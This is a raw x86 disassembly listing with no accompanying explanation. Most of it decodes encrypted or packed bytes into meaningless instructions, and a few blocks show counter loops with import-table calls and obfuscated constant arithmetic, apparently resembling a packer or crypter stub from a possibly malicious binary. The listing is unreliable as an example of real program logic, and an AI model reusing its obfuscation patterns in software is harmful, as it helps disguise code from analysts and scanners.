  405149:	lock iret 
  40514b:	mov    cl,0xa3
  40514d:	jo     0x4050e2
  40514f:	inc    eax
  405150:	mov    dh,0xd8
  405152:	ins    DWORD PTR es:[edi],dx
  405153:	std    
  405154:	mov    eax,DWORD PTR [esi]
  405156:	inc    esp
  405157:	push   ecx
  405158:	scas   al,BYTE PTR es:[edi]
  405159:	call   0xb6d9c7f0
  40515e:	imul   edx,DWORD PTR [esi],0xfffffff2
  405161:	ficom  WORD PTR [ebp+0x382f638c]
  405167:	jne    0x40511f
  405169:	in     eax,dx
  40516a:	inc    ebp
  40516b:	push   0x185796b8
  405170:	stos   DWORD PTR es:[edi],eax
  405171:	aas    
  405172:	test   DWORD PTR fs:[edi+0x59e6eba5],edx
  405179:	lods   eax,DWORD PTR ds:[esi]
  40517a:	lock add al,0xfa
  40517d:	out    0x45,al
  40517f:	cmp    DWORD PTR [ebp+0x36],edi
  405182:	push   esi
  405183:	stc    
  405184:	or     al,0xbd
  405186:	ds cmp al,0x7a
  405189:	test   eax,0xa671810e
  40518e:	pop    ebp
  40518f:	fidiv  WORD PTR [edi-0x60]
  405192:	push   esp
  405193:	cmpxchg edx,eax
  405196:	or     BYTE PTR [ebx+0x21f78efb],bl
  40519c:	mov    al,0x8d
  40519e:	xor    dh,al
  4051a0:	pop    ss
  4051a1:	inc    esp
  4051a2:	push   cs
  4051a3:	fst    DWORD PTR [edx-0x3]
  4051a6:	add    eax,0xb780030f
  4051ab:	sub    al,0x11
  4051ad:	or     ch,BYTE PTR [eax*2-0x709f8a2]
  4051b4:	pop    eax
  4051b5:	push   esi
  4051b6:	pusha  
  4051b7:	sahf   
  4051b8:	(bad)  
  4051b9:	jge    0x4051ce
  4051bb:	inc    eax
  4051bc:	adc    al,0x7d
  4051be:	xchg   esi,eax
  4051bf:	sti    
  4051c0:	sbb    al,0xa7
  4051c2:	xchg   BYTE PTR [ebp+ecx*2-0x4e],al
  4051c6:	jns    0x4051fb
  4051c8:	les    edi,FWORD PTR [esi+esi*8+0x3a]
  4051cc:	mov    bl,0xe
  4051ce:	ret    0x92ac
  4051d1:	into   
  4051d2:	sti    
  4051d3:	pop    ds
  4051d4:	and    dl,BYTE PTR ds:0xfd9d87f0
  4051da:	mov    ds:0x386f2e8a,eax
  4051df:	xchg   esp,eax
  4051e0:	dec    esi
  4051e1:	test   eax,0x2bdf6d3
  4051e6:	adc    al,0xec
  4051e8:	add    edi,edx
  4051ea:	inc    esi
  4051eb:	out    0xbe,eax
  4051ed:	nop
  4051ee:	fld    TBYTE PTR [edx+ebp*2+0x1a]
  4051f2:	add    ebx,DWORD PTR [eax+eax*8]
  4051f5:	pop    esi
  4051f6:	arpl   WORD PTR cs:[eax+0x31],sp
  4051fa:	mov    ch,0x26
  4051fc:	lock in al,0x72
  4051ff:	jl     0x40518f
  405201:	mov    edi,0xfce32dd7
  405206:	mov    BYTE PTR [edi-0x499e11c9],al
  40520c:	cmp    DWORD PTR [eax],esp
  40520e:	pop    ebx
  40520f:	cmc    
  405210:	xor    DWORD PTR [eax-0x7c18eca5],ebp
  405216:	daa    
  405217:	scas   al,BYTE PTR es:[edi]
  405218:	loop   0x405291
  40521a:	loope  0x4051d9
  40521c:	fdiv   DWORD PTR [eax+esi*4+0x7e]
  405220:	mov    cl,0x59
  405222:	dec    ecx
  405223:	(bad)  
  405224:	stos   BYTE PTR es:[edi],al
  405225:	div    DWORD PTR ds:0x1c0773b
  40522b:	sub    ebp,DWORD PTR [esi+0x1cc4d461]
  405231:	(bad)  
  405232:	dec    ebx
  405233:	push   ds
  405234:	sbb    BYTE PTR [ebp+ebx*8+0x1840e19f],dl
  40523b:	es mov dl,0x7c
  40523e:	inc    esp
  40523f:	xor    DWORD PTR [ecx-0x112ff076],esi
  405245:	outs   dx,DWORD PTR ds:[esi]
  405246:	push   0xffffff9e
  405248:	jnp    0x405275
  40524a:	ins    DWORD PTR es:[edi],dx
  40524b:	ins    BYTE PTR es:[edi],dx
  40524c:	jnp    0x40521e
  40524e:	ds inc edx
  405250:	jecxz  0x4052c9
  405252:	sub    eax,0x95c04666
  405257:	fisub  WORD PTR ds:0x7568e1eb
  40525d:	cmp    esp,ebp
  40525f:	mov    ebp,0xdbbaac05
  405264:	add    eax,0xda287efa
  405269:	dec    edx
  40526a:	add    BYTE PTR [edx+0x4b],ch
  40526d:	inc    esp
  40526e:	stos   BYTE PTR es:[edi],al
  40526f:	dec    edi
  405270:	call   0x24395b76
  405275:	cmp    eax,0x5059da3e
  40527a:	fstp   QWORD PTR [edx]
  40527c:	or     edx,DWORD PTR [esi]
  40527e:	xor    BYTE PTR [eax+ecx*8-0x3b2517fb],dl
  405285:	jge    0x405245
  405287:	rcr    BYTE PTR [edx+0x45],cl
  40528a:	sbb    ch,BYTE PTR [ebx-0x146ef53f]
  405290:	cwde   
  405291:	sub    BYTE PTR [ebp+0xd],dl
  405294:	adc    eax,0x588901da
  405299:	dec    ebx
  40529a:	test   al,0x7b
  40529c:	sub    al,bh
  40529e:	loopne 0x4052a7
  4052a0:	call   0x5fbb1012
  4052a5:	xchg   BYTE PTR [edi],cl
  4052a7:	scas   eax,DWORD PTR es:[edi]
  4052a8:	xlat   BYTE PTR ds:[ebx]
  4052a9:	mov    edi,DWORD PTR [ebp-0x18]
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x4304a6,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x4304a6
  4052ff:	inc    eax
  405300:	mov    ds:0x4304a6,eax
  405305:	cmp    DWORD PTR ds:0x4304a6,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x4304a6,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eaa8
  40533f:	cmp    DWORD PTR ds:0x4304a6,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x4304a6
  405351:	inc    eax
  405352:	mov    ds:0x4304a6,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x4304da
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x43056a
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x4304c2
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x4304b2,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x4304a6
  40538a:	add    DWORD PTR ds:0x42e772,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x4304be,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x4304be
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x4304be,ecx
  4053ae:	cmp    DWORD PTR ds:0x4304be,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42eba0
  4053c9:	cmp    DWORD PTR ds:0x4304be,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ee14,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ee14
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ee14,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ee14,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42e9e4
  405405:	cmp    DWORD PTR ds:0x42ee14,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ee14
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ee14,ecx
  40541f:	cmp    DWORD PTR ds:0x42ee14,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0x443fb609
  405456:	adc    dl,0x24
  405459:	jle    0x4054d9
  40545b:	mov    ebp,0x87e7e71
  405460:	cwde   
  405461:	sub    eax,0x4d328fa1
  405466:	gs cmp bh,dl
  405469:	js     0x4054e6
  40546b:	out    0xc7,al
  40546d:	and    DWORD PTR [edi],0xdabea726
  405473:	pop    ss
  405474:	enter  0x8b4,0x76
  405478:	rcl    DWORD PTR [edi-0x5ae5861],cl
  40547e:	shl    DWORD PTR [edx-0x18],1
  405481:	mov    al,ds:0x5ca184ae
  405486:	test   al,0xbe
  405488:	call   0xf50a19b3
  40548d:	cli    
  40548e:	add    al,0xa9
  405490:	inc    eax
  405491:	out    0xab,eax
  405493:	pop    ds
  405494:	fstp   QWORD PTR [esi+edi*4-0x37]
  405498:	xchg   edi,eax
  405499:	sar    DWORD PTR [ebx+0x60797c2],1
  40549f:	lods   al,BYTE PTR ds:[esi]
  4054a0:	mov    ah,BYTE PTR [ebx+0x8]
  4054a3:	mov    dh,0xc0
  4054a5:	fcomp  QWORD PTR [esi-0xbc291c7]
  4054ab:	push   esp
  4054ac:	ds repnz mov esi,0xce9fa8a8
  4054b3:	xor    cl,dl
  4054b5:	mov    edi,DWORD PTR [ebx-0x65d4340b]
  4054bb:	add    eax,0x32eb46b0
  4054c0:	nop
  4054c1:	retf   0x2e8d
  4054c4:	loopne 0x4054cd
  4054c6:	push   edx
  4054c7:	dec    ebp
  4054c8:	fmul   DWORD PTR [ebx-0x42]
  4054cb:	ret    
  4054cc:	es pop es
  4054ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054d0:	pop    esp
  4054d1:	repz sub bh,BYTE PTR [ecx-0x5527d309]
  4054d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054d9:	inc    edi
  4054da:	mov    bh,0x3f
  4054dc:	inc    esp
  4054dd:	fmul   DWORD PTR [ecx]
  4054df:	div    BYTE PTR [esi]
  4054e1:	lock mov ecx,0x3956606c
  4054e7:	mov    DWORD PTR [ebx],0xd8afe0a7
  4054ed:	xchg   ecx,eax
  4054ee:	add    edi,DWORD PTR [ebp-0x7f2cb4d9]
  4054f4:	or     al,0x8
  4054f6:	loopne 0x405484
  4054f8:	xchg   ecx,eax
  4054f9:	loop   0x4054a6
  4054fb:	and    al,0xa4
  4054fd:	or     BYTE PTR [ecx+0x4e],cl
  405500:	mov    dl,0x65
  405502:	int3   
  405503:	inc    esp
  405504:	push   edi
  405505:	adc    al,0x1d
  405507:	xor    eax,0x9bf1cb0c
  40550c:	pop    ds
  40550d:	add    edi,esi
  40550f:	xchg   edi,eax
  405510:	xchg   esp,eax
  405511:	ret    0xf075
  405514:	jbe    0x40551d
  405516:	js     0x4054d6
  405518:	push   edx
  405519:	out    0x90,eax
  40551b:	das    
  40551c:	add    BYTE PTR [eax-0x382ebfb6],0x70
  405523:	ds pushf 
  405525:	mov    esi,0x48eeb4d5
  40552a:	into   
  40552b:	clc    
  40552c:	ins    BYTE PTR es:[edi],dx
  40552d:	jge    0x4054e5
  40552f:	inc    eax
  405530:	mov    ecx,eax
  405532:	fsub   st(7),st
  405534:	shl    DWORD PTR [eax],cl
  405536:	jne    0x4055aa
  405538:	pop    ss
  405539:	(bad)  
  40553a:	rol    BYTE PTR [eax+0x5e],cl
  40553d:	es dec ecx
  40553f:	jne    0x405565
  405541:	scas   eax,DWORD PTR es:[edi]
  405542:	scas   eax,DWORD PTR es:[edi]
  405543:	add    eax,0x8cb4e1b4
  405548:	dec    edx
  405549:	imul   ebp,DWORD PTR [eax+0x12],0xa4ba4074
  405550:	add    BYTE PTR [esp+esi*4-0x52],dh
  405554:	(bad)  
  405555:	xchg   edx,eax
  405556:	jle    0x40556b
  405558:	into   
  405559:	std    
  40555a:	add    al,0x25
  40555c:	mov    ds:0xca50fe48,al
  405561:	and    DWORD PTR [ebp-0x7e611d3d],edx
  405567:	aam    0x41
  405569:	mov    cl,BYTE PTR [esi-0x4]
  40556c:	(bad)  
  40556d:	sbb    DWORD PTR [ecx+eiz*1+0x58d2dc8],ebx
  405574:	xchg   esi,eax
  405575:	xchg   ebx,eax
  405576:	shl    dl,cl
  405578:	popf   
  405579:	dec    ebp
  40557a:	jne    0x405571
  40557c:	xchg   DWORD PTR [edi],ebx
  40557e:	scas   al,BYTE PTR es:[edi]
  40557f:	fwait
  405580:	int3   
  405581:	add    eax,0xae082d06
  405586:	mov    ecx,0x47164fe
  40558b:	mov    ebx,0x5aa403be
  405590:	mov    dh,0x2b
  405592:	pop    edi
  405593:	cmp    BYTE PTR [ebx],cl
  405595:	dec    ecx
  405596:	mov    al,ds:0x7d2cc4a5
  40559b:	imul   edi,DWORD PTR [edi],0xb211f2ac
  4055a1:	pop    esi
  4055a2:	add    al,0xed
  4055a4:	into   
  4055a5:	lahf   
  4055a6:	mov    bl,0x96
  4055a8:	lock pop ecx
  4055aa:	fsub   st,st(6)
  4055ac:	xchg   esp,eax
  4055ad:	(bad)  
  4055ae:	pop    edx
  4055af:	mov    esi,0x77fe368e
  4055b4:	and    DWORD PTR [eax],ecx
  4055b6:	in     eax,0x6b
  4055b8:	fcmovnb st,st(3)
  4055ba:	(bad)  
  4055bc:	out    0x88,al
  4055be:	(bad)  
  4055bf:	adc    ah,BYTE PTR [eax-0x375db8a7]
  4055c5:	add    dl,BYTE PTR [ecx+0x6a]
  4055c8:	fcomp  QWORD PTR [esi-0x670c194]
  4055ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055cf:	jp     0x4055e4
  4055d1:	jge    0x40559f
  4055d3:	adc    ah,BYTE PTR [eax-0x4a4790d1]
  4055d9:	outs   dx,DWORD PTR ds:[esi]
  4055da:	pop    edi
  4055db:	pop    eax
  4055dc:	je     0x40562b
  4055de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055df:	push   cs
  4055e0:	xchg   ebx,eax
  4055e1:	sub    DWORD PTR [ebp-0x7691ade2],0x2d
  4055e8:	int    0x80
  4055ea:	mov    al,ds:0xf158fe52
  4055ef:	test   BYTE PTR [eax-0x6a6479a1],dh
  4055f5:	jmp    0x40559b
  4055f7:	xor    BYTE PTR [eax],0x92
  4055fa:	idiv   ebp
  4055fc:	push   edx
  4055fd:	xor    eax,0xfbd5123d
  405602:	(bad)  
  405603:	mov    cl,0x1d
  405605:	and    esp,ecx
  405607:	sub    al,0x7f
  405609:	lahf   
  40560a:	lods   eax,DWORD PTR ds:[esi]
  40560b:	cld    
  40560c:	inc    ecx
  40560d:	in     eax,0x96
  40560f:	fcmovnu st,st(6)
  405611:	mov    ah,BYTE PTR [ebx-0x33674a68]
  405617:	call   0x6bfb:0x274c6fc1
  40561e:	push   eax
  40561f:	(bad)  
  405620:	icebp  
  405621:	xchg   esp,eax
  405622:	or     DWORD PTR [esi],edx
  405624:	and    edx,ebx
  405626:	ds xchg edx,eax
  405628:	mov    eax,0x4b089aa8
  40562d:	pusha  
  40562e:	add    eax,0xa31c1774
  405633:	bnd js 0x4055b9
  405636:	loope  0x4055d4
  405638:	inc    edi
  405639:	js     0x405628
  40563b:	adc    ebx,DWORD PTR [edi-0x258625db]
  405641:	std    
  405642:	jg     0x405611
  405644:	fistp  QWORD PTR [ebp-0x44]
  405647:	or     BYTE PTR [edx],dl
  405649:	rcr    BYTE PTR [eax+0x1f],0x1b
  40564d:	jns    0x405665
  40564f:	inc    esi
  405650:	lea    ebx,[edx-0x5dd210a9]
  405656:	sbb    al,0x42
  405658:	fdivr  QWORD PTR [ebp-0x7e]
  40565b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40565c:	dec    edi
  40565d:	mov    BYTE PTR [ebp-0x768dba3f],dl
  405663:	in     al,0x9e
  405665:	jmp    0x40567d
  405667:	xor    eax,0x3402ca30
  40566c:	scas   eax,DWORD PTR es:[edi]
  40566d:	mov    ds:0x5602bbe5,al
  405672:	mov    edx,ss
  405674:	shr    BYTE PTR [edx+0x64],0x25
  405678:	popf   
  405679:	cmp    bl,BYTE PTR [esi-0x5a40e83d]
  40567f:	adc    eax,DWORD PTR [esp+ecx*4]
  405682:	mov    eax,0x1ca0711d
  405687:	mov    edi,0x5a2b22ee
  40568c:	jnp    0x4056d5
  40568e:	lods   eax,DWORD PTR ds:[esi]
  40568f:	test   bh,cl
  405691:	fs sbb ebp,0x73
  405695:	adc    BYTE PTR [edi],0x93
  405698:	inc    ebx
  405699:	out    dx,al
  40569a:	loope  0x40564d
  40569c:	(bad)  
  40569d:	xor    BYTE PTR [ebx-0x58a2aa04],dl
  4056a3:	(bad)  
  4056a4:	std    
  4056a5:	cmovb  ebx,DWORD PTR gs:[eax+0x1f]
  4056aa:	in     al,0xb4
  4056ac:	push   ebx
  4056ad:	test   DWORD PTR [ebx],0xeca3fee5
  4056b3:	mov    bl,0xe2
  4056b5:	aas    
  4056b6:	add    ebp,esp
  4056b8:	xor    cl,bh
  4056ba:	loop   0x405665
  4056bc:	xor    eax,0x40fbcbec
  4056c1:	add    eax,DWORD PTR [eax+0x33]
  4056c4:	nop
  4056c5:	pop    edi
  4056c6:	sahf   
  4056c7:	daa    
  4056c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056c9:	add    al,0x37
  4056cb:	xor    esp,esi
  4056cd:	xor    DWORD PTR [edi],esp
  4056cf:	push   edx
  4056d0:	fdivp  st(7),st
  4056d2:	fldpi  
  4056d4:	(bad)  
  4056d5:	sbb    eax,0x4fa485f3
  4056da:	inc    ecx
  4056db:	fwait
  4056dc:	mov    al,0xa0
  4056de:	or     eax,0xe10c361e
  4056e3:	mov    ebx,0x6ba75d4e
  4056e8:	jge    0x40568b
  4056ea:	(bad)  
  4056eb:	jmp    0x405690
  4056ed:	mov    eax,DWORD PTR [esi+0x62]
  4056f0:	or     BYTE PTR [ebx+edx*2-0x35],ch
  4056f4:	fild   WORD PTR [edx]
  4056f6:	mov    ebx,0x64d98b42
  4056fb:	sar    ebp,0xe9
  4056fe:	cwde   
  4056ff:	inc    eax
  405700:	das    
  405701:	std    
  405702:	or     dh,al
  405704:	sbb    eax,0xa61bb10
  405709:	add    al,0x59
  40570b:	push   0x308121f
  405710:	shl    BYTE PTR [ecx],cl
  405712:	fcomp  QWORD PTR [eax+0xe942989]
  405718:	and    edx,ebx
  40571a:	lock in al,0x27
  40571d:	xchg   esi,eax
  40571e:	pop    DWORD PTR [ecx+0x7a93a7e3]
  405724:	mov    edx,0xa8d88376
  405729:	pop    ecx
  40572a:	jmp    0x4056fc
  40572c:	inc    edx
  40572d:	mov    cl,0x88
  40572f:	jns    0x4056cd
  405731:	mov    edi,gs
  405733:	dec    edi
  405734:	push   ebx
  405736:	dec    ecx
  405737:	or     eax,0xfd213e89
  40573c:	aam    0x47
  40573e:	adc    eax,DWORD PTR [ebx]
  405740:	xchg   ebx,eax
  405741:	test   edx,0xebcdf86e
  405747:	mov    al,0xbb
  405749:	adc    BYTE PTR [edi-0x2fb40759],al
  40574f:	sub    ch,BYTE PTR [edx]
  405751:	cwde   
  405752:	adc    al,0x24
  405754:	gs into 
  405756:	mov    ebx,0xca39a7e1
  40575b:	mov    ah,0x8a
  40575d:	mov    ch,0x72
  40575f:	fdivr  QWORD PTR [ecx+0x18]
  405762:	push   edi
  405763:	ja     0x40571f
  405765:	mov    edi,0xeef216f0
  40576a:	pop    esi
  40576b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40576c:	mov    al,ds:0x1244d714
  405771:	xor    eax,0xab47ed01
  405776:	stos   DWORD PTR es:[edi],eax
  405777:	and    dh,BYTE PTR ds:0x5b9e9da0
  40577d:	add    edi,DWORD PTR [eax]
  40577f:	push   edi
  405780:	adc    DWORD PTR ds:0x2348c25c,ecx
  405786:	or     ah,cl
  405788:	xchg   ecx,eax
  405789:	sbb    DWORD PTR [edi-0x7e1c35bd],edx
  40578f:	lods   al,BYTE PTR ds:[esi]
  405790:	fs cli 
  405792:	and    eax,0xa5e659bc
  405797:	mov    eax,ds:0xc1cc7c43
  40579c:	loopne 0x4057e3
  40579e:	pusha  
  40579f:	arpl   WORD PTR [eax],bp
  4057a1:	xor    ebx,DWORD PTR [esi+0x67187e44]
  4057a7:	sbb    eax,0xc7bb66ea
  4057ac:	jmp    0x4057c1
  4057ae:	xchg   esi,eax
  4057af:	dec    esi
  4057b0:	adc    dl,BYTE PTR [edx]
  4057b2:	sub    cl,BYTE PTR [edx-0x70c2c147]
  4057b8:	dec    edi
  4057b9:	jg     0x405762
  4057bb:	or     eax,0x20b2d7fc
  4057c0:	sub    esp,DWORD PTR [edx-0x2f0e3ace]
  4057c6:	mov    esi,0x727dffa7
  4057cb:	adc    eax,0x2e55de23
  4057d0:	into   
  4057d1:	ud2    
  4057d3:	mov    al,ds:0xdff5a851
  4057d8:	add    eax,DWORD PTR [esi+0x28]
  4057db:	retf   
  4057dc:	mov    ss,WORD PTR [eax+0x23]
  4057df:	jnp    0x4057e6
  4057e1:	add    al,0x5c
  4057e3:	mov    bh,0xc3
  4057e5:	scas   al,BYTE PTR es:[edi]
  4057e6:	mov    cl,0x58
  4057e8:	rcr    BYTE PTR [edi+0x64174414],cl
  4057ee:	push   es
  4057ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057f0:	mov    esp,0xf5cdf859
  4057f5:	adc    DWORD PTR [esp+ebx*4],ebx
  4057f8:	pop    ebp
  4057f9:	xchg   edx,eax
  4057fa:	xor    BYTE PTR [edx],bh
  4057fc:	fwait
  4057fd:	jns    0x4057e9
  4057ff:	push   ss
  405800:	fldlg2 
  405802:	dec    ebx
  405803:	leave  
  405804:	out    dx,eax
  405805:	into   
  405806:	or     al,0xf2
  405808:	cmp    BYTE PTR [edx-0x80],bh
  40580b:	xchg   ebp,eax
  40580c:	inc    eax
  40580d:	test   BYTE PTR [esi-0x4a7271fd],al
  405813:	rol    BYTE PTR [ebp+0x4b],1
  405816:	add    eax,0x1c2ff1cb
  40581b:	popa   
  40581c:	jb     0x4057cf
  40581e:	cmp    edi,edx
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8-0xd50f2c4],bh
  405847:	fist   DWORD PTR [ecx]
  405849:	cmp    BYTE PTR [esi+0x7e],bh
  40584c:	mov    ebp,0xdf7e7e71
  405851:	jo     0x40585d
  405853:	push   es
  405854:	xbegin 0x53629315
  40585a:	hlt    
  40585b:	arpl   WORD PTR [edx+ebp*8-0x38],bp
  40585f:	mov    edi,DWORD PTR [esi]
  405861:	inc    esi
  405862:	mov    DWORD PTR [esi],ecx
  405864:	xchg   ecx,eax
  405865:	addr16 sub al,0x23
  405868:	ret    
  405869:	es jnp 0x4058de
  40586c:	jns    0x405853
  40586e:	mov    bl,0xed
  405870:	in     eax,dx
  405871:	push   ebx
  405872:	mov    ecx,0xff707627
  405877:	int    0x54
  405879:	add    DWORD PTR [edx-0x21],esp
  40587c:	daa    
  40587d:	shl    DWORD PTR [ebx+0x466c26b3],1
  405883:	ins    DWORD PTR es:[edi],dx
  405884:	xchg   ebp,eax
  405885:	inc    ebp
  405886:	mov    dl,0x18
  405888:	dec    ebp
  405889:	dec    edx
  40588a:	xchg   DWORD PTR [ebx-0xa0f9224],edx
  405890:	aaa    
  405891:	jmp    0xd7668c74
  405896:	pop    edx
  405897:	cmp    DWORD PTR [edx+0x2a9a26ae],ebx
  40589d:	cwde   
  40589e:	cmc    
  40589f:	dec    ebp
  4058a0:	mov    cl,0xa0
  4058a2:	jp     0x4058fc
  4058a4:	pusha  
  4058a5:	mov    BYTE PTR [edi+esi*4+0x719b3453],al
  4058ac:	xchg   edx,eax
  4058ad:	(bad)  
  4058ae:	jns    0x4058d6
  4058b0:	push   ds
  4058b1:	int3   
  4058b2:	outs   dx,BYTE PTR ds:[esi]
  4058b3:	ror    edx,1
  4058b5:	repnz out 0x30,eax
  4058b8:	jb     0x4058c7
  4058ba:	repnz mov ch,0x1e
  4058bd:	imul   ecx,esi,0xc84b8f8e
  4058c3:	call   0xcd33:0xd5c3b61e
  4058ca:	stc    
  4058cb:	test   al,0x55
  4058cd:	test   eax,0xe57915c
  4058d2:	mov    ds:0x50dd455b,eax
  4058d7:	mov    ch,0x80
  4058d9:	sub    DWORD PTR [edx+0x3c559c58],esp
  4058df:	cmp    esi,edi
  4058e1:	jp     0x4058c7
  4058e3:	pop    es
  4058e4:	es popa 
  4058e6:	(bad)  
  4058e7:	xchg   ecx,eax
  4058e8:	ins    DWORD PTR es:[edi],dx
  4058e9:	mov    ch,0xb7
  4058eb:	lods   al,BYTE PTR ds:[esi]
  4058ec:	pop    esi
  4058ed:	or     BYTE PTR [ebx],0x68
  4058f0:	or     esi,DWORD PTR [ebp-0x49151e65]
  4058f6:	jb     0x4058ca
  4058f8:	sbb    al,0xb8
  4058fa:	cmc    
  4058fb:	cli    
  4058fc:	pushf  
  4058fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058fe:	ret    0x4fa9
  405901:	repz mov al,ds:0x9ab94065
  405907:	fbstp  TBYTE PTR [eax]
  405909:	lahf   
  40590a:	or     al,0x1c
  40590c:	inc    esi
  40590d:	hlt    
  40590e:	fnstsw WORD PTR [edx+0x0]
  405911:	aaa    
  405912:	cmp    al,0xed
  405914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405915:	int3   
  405916:	outs   dx,BYTE PTR ds:[esi]
  405917:	xchg   ecx,eax
  405918:	pop    edi
  405919:	add    ecx,ebp
  40591b:	icebp  
  40591c:	push   ecx
  40591d:	jo     0x4058a3
  40591f:	sti    
  405920:	cmp    esi,DWORD PTR [ebp+0x5029038b]
  405926:	call   0x7f6f:0xcfbbd4c6
  40592d:	sub    BYTE PTR [esi+ecx*2+0x1],0xb8
  405932:	add    bh,BYTE PTR [esi]
  405934:	mov    ah,0x71
  405936:	fstp   QWORD PTR [esi-0x18]
  405939:	and    eax,0xfc6ca793
  40593e:	pop    esp
  40593f:	loopne 0x40599d
  405941:	jo     0x40591c
  405943:	pop    edx
  405944:	aad    0x38
  405946:	and    BYTE PTR [esp+ecx*2-0x61cf340],cl
  40594d:	xchg   edi,eax
  40594e:	ins    DWORD PTR es:[edi],dx
  40594f:	into   
  405950:	or     al,0x3
  405952:	mov    ds:0x1ebc1255,eax
  405957:	iret   
  405958:	xor    DWORD PTR [edi],eax
  40595a:	pop    ecx
  40595b:	xchg   ebp,eax
  40595c:	add    al,0xf5
  40595e:	jge    0x40599a
  405960:	jo     0x405987
  405962:	mov    ds:0x559d591d,eax
  405967:	loop   0x405928
  405969:	sbb    bh,BYTE PTR [ebp+0x3f0809d8]
  40596f:	ja     0x405937
  405971:	push   0x2f8968a
  405976:	dec    edi
  405977:	not    bh
  405979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40597a:	aam    0x6d
  40597c:	inc    edi
  40597d:	jbe    0x4059c3
  40597f:	mov    ebp,0x725b27de
  405984:	imul   ecx,DWORD PTR [ebp+0x8],0xffffff82
  405988:	dec    eax
  405989:	sbb    al,0xce
  40598b:	or     al,0x9b
  40598d:	dec    esp
  40598e:	mov    al,0x7a
  405990:	or     ebp,DWORD PTR [edx+0x4b]
  405993:	cmp    eax,0x62719025
  405998:	iret   
  405999:	lds    ecx,FWORD PTR [esi-0x15]
  40599c:	call   0xd6e5:0x582a6302
  4059a3:	mov    ds:0xf0e6f3fb,eax
  4059a8:	ins    BYTE PTR es:[edi],dx
  4059a9:	add    al,0x4d
  4059ab:	sbb    al,0x6
  4059ad:	push   0xffffff9c
  4059af:	and    ebp,DWORD PTR [eax-0x7a106fe]
  4059b5:	out    dx,eax
  4059b6:	dec    edi
  4059b7:	aaa    
  4059b8:	dec    esp
  4059b9:	loop   0x4059a7
